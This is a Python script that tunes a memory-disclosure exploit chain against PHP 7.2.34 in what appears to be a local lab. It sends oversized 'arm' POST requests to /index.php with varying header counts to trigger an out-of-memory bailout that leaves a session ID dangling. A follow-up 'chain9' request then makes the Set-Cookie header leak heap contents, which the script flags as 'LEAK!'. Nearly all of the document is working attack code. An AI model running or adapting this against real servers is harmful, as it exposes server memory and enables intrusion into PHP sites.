#!/usr/bin/env python3
"""Calibrate the dinosn arm size on 7.2.34 (lab config 512M/128M) to find the
arm OOM that soft-bailouts AND leaves PS(id) dangled, so the chain9 consumer's
Set-Cookie leaks heap. Vary arm nheaders; keep the chain9 consumer fixed."""
import sys, os, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import drive as D

PORT = 18106
# chain9 consumer (dinosn 7.2 params)
def consumer():
    return D.chain9_body(614000, 40, 1, 77, 60000, 84000, 82000)

def cookie_len(port):
    c = D.Conn("127.0.0.1", port, False, timeout=180)
    try:
        arm = D.arm_body(NH, b"a:\n", b"\x00")
        ra = c.post("/index.php", arm, False, maxread=65536)
        time.sleep(0.3)
        cons = consumer()
        rc = c.post("/index.php", cons, False, maxread=8 << 20)
        sc = rc["headers"].get("set-cookie", "")
        arm_hard = (b"Allowed memory size" in ra["body"]) or (b"Fatal error" in ra["body"])
        return len(sc), arm_hard, rc["status"]
    finally:
        c.close()

for NH in [300000, 600000, 900000, 1299780, 1800000, 2400000]:
    t0 = time.time()
    try:
        clen, arm_hard, cstat = cookie_len(PORT)
        verdict = "LEAK!" if clen > 100 else "no-leak"
        print("arm_nh=%-8d cons_cookie=%-6d arm_hard=%-5s cons=%-22s %s  (%.1fs)"
              % (NH, clen, arm_hard, cstat, verdict, time.time()-t0), flush=True)
    except Exception as e:
        print("arm_nh=%-8d ERR %r" % (NH, e), flush=True)
    time.sleep(1.0)
print("DONE")
